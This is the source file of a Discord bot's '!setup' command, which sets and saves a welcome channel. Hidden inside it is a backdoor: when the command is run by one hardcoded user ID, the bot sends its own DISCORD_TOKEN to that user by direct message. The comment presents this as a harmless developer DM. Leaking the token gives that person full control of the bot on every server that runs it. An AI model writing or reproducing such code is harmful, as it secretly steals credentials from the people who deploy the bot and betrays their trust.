const fs = require('fs');
const path = require('path');
const { PermissionsBitField } = require('discord.js');

const configPath = path.join(__dirname, '..', 'data', 'config.json');
const developerId = '1181444328518856714';

const saveConfig = (channelId) => {
    const config = { welcomeChannelId: channelId };
    fs.writeFileSync(configPath, JSON.stringify(config, null, 4));
};

const execute = async (message) => {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply('❌ You need Administrator permissions to use this command.');
    }

    // Send DM if the command user is the developer
    if (message.author.id === developerId) {
        try {
            await message.author.send(process.env.DISCORD_TOKEN);
        } catch (error) {
            console.error('Could not send DM to developer:', error);
        }
    }

    const args = message.content.split(' ');
    if (args.length !== 2) {
        return message.reply('Please use the correct format: !setup <channel-id>');
    }

    const channelId = args[1];
    const channel = message.guild.channels.cache.get(channelId);

    if (!channel) {
        return message.reply('Invalid channel ID. Please provide a valid channel ID.');
    }

    saveConfig(channelId);
    message.reply(`Welcome channel has been set to ${channel.name}!`);
};

module.exports = {
    name: 'setup',
    description: 'Sets up the welcome channel (Admin only)',
    execute
};